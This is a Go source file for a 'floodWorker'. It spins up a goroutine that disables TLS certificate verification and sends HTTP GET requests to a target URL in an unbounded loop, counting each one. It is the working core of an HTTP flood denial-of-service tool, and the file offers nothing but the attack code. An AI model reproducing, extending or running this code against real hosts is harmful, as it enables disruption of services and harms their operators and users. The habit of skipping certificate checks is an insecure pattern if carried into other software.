package main

import (
	"crypto/tls"
	"net/http"
	"net/url"
)

type floodWorker struct {
	exitChan chan int
	id       int
	target   url.URL
}

func (fw *floodWorker) Start() {
	defer fw.End()
	go func() {
		//Skip certificate verify for performance
		secureTransport := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client := &http.Client{}
		if fw.target.Scheme == "https" {
			client = &http.Client{Transport: secureTransport}
		}
		for {
			client.Get(fw.target.String())
			totalRequestsSent += 1
		}
	}()
}

func (fw *floodWorker) End() {
	fw.exitChan <- fw.id
}
